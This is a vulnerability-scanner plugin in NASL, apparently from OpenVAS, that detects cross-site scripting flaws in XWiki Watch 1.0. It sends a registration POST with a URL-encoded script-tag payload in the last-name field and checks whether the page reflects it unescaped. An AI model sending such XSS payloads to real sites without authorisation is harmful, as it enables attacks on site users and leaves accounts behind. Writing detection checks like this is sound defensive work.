# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801564");
  script_version("2023-10-27T05:05:28+0000");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2011-01-08 10:30:18 +0100 (Sat, 08 Jan 2011)");
  script_cve_id("CVE-2010-4640");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("XWiki Watch Multiple Cross Site Scripting Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/42090");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/44606");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/62941");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/62940");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"insight", value:"Multiple flaws are due to:

  - An  Input passed via the 'rev' parameter to 'xwiki/bin/viewrev/Main/WebHome'
  or 'xwiki/bin/view/Blog' is not properly sanitised before being returned to the user.

  - An Input passed via the 'register_first_name' and 'register_last_name'
  parameters to 'xwiki/bin/register/XWiki/Register' is not properly sanitised
  before being displayed to the user.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"XWiki Watch is prone to multiple cross site scripting vulnerabilities.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser
  session in the context of an affected site when malicious data is being viewed.");

  script_tag(name:"affected", value:"XWiki Watch version 1.0");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

xwport = http_get_port(default:8080);

res = http_get_cache(item:"/xwiki/bin/view/Main/WebHome", port:xwport);

if("XWiki - Main - WebHome" >!< res &&
   "Welcome to your XWiki Watch" >!< res){
 exit(0);
}

filename = "/xwiki/bin/register/XWiki/Register";
useragent = http_get_user_agent();
host = http_host_name( port:xwport );

authVariables ="template=XWiki.XWikiUserTemplate&register=1&register_first_name" +
               "=dingdong&register_last_name=%3Cscript%3Ealert%281111%29%3C%2Fscr" +
               "ipt%3E&xwikiname="+rand()+"&register_password=dingdong&register2_passwor" +
               "d=dingdong&register_email=dingdong";

req = string("POST ", filename, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
             "Accept-Language: en-us,en;q=0.5\r\n",
             "Keep-Alive: 300\r\n",
             "Connection: keep-alive\r\n",
             "Referer: http://", host, filename, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(authVariables), "\r\n\r\n",
             authVariables);
res = http_keepalive_send_recv(port:xwport, data:req);

if(res =~ "^HTTP/1\.[01] 200" && "<script>alert(1111)</script></" >< res && "Registration successful.">< res){
  report = http_report_vuln_url(port:xwport, url:filename);
  security_message(port:xwport, data:report);
}
